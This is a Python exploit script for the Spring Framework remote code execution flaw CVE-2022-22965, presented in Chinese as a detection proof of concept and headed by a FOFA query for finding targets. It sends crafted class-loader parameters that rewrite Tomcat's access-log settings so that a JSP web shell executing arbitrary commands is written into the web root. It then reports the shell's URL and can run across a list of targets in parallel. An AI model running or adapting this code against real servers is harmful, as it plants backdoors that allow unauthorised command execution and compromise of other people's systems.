#FOFA: icon_hash="116323821"

import requests
import re
import argparse
import urllib3
import urllib
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
import random
import string
import json
import time

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': 'Spring Framework 远程命令执行漏洞(CVE-2022-22965)',
        'vulnerable': False
    }
    post_headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    timeout = 4
    get_headers = {
        "prefix": "<%",
        "suffix": "%>//",
        "c": "Runtime",
    }
    directory = 'webapps/ROOT'
    filename = ''.join(random.sample(string.digits + string.ascii_letters, 7))
    verify_url = urllib.parse.urljoin(target, filename + '.jsp?cmd=')
    log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
                  f"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter" \
                  f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
                  f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"

    log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
    log_file_dir = f"class.module.classLoader.resources.context.parent.pipeline.first.directory={directory}"
    log_file_prefix = f"class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}"
    log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    exp_data = "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])
    file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
    try:
        ret = requests.post(verify_url, headers=get_headers, verify=False, timeout=timeout)
        if ret.status_code == 404 and json.loads(ret.text)['path'] == "/" + filename + ".jsp":
            ret1 = requests.post(target, headers=post_headers, data=file_date_data, verify=False, timeout=timeout)
            if ret1.status_code == 200:
                ret2 = requests.post(target, headers=post_headers, data=exp_data, verify=False, timeout=timeout)
                if ret2.status_code == 200:
                    time.sleep(3)
                    ret3 = requests.get(target, headers=get_headers, verify=False, timeout=timeout)
                    if ret3.status_code == 200:
                        time.sleep(1)
                        pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
                        ret4 = requests.post(target, headers=post_headers, data=pattern_data, verify=False,timeout=timeout)
                        time.sleep(5)
                        check = requests.get(verify_url, timeout=timeout)
                        check2 = requests.get(
                            urllib.parse.urljoin(target, ''.join(random.sample(string.digits + string.ascii_letters, 5))),
                            timeout=timeout)
                        if ret4.status_code == 200 and check2.status_code != check.status_code or check.status_code == 500:
                            result['vulnerable'] = True
                            result['url'] = target
                            result['webshell'] = verify_url
        print(result)
    except:
        print(f"{target}访问失败")


def main():
    parser = argparse.ArgumentParser("CVE-2022-22965Spring Framework 远程命令执行漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()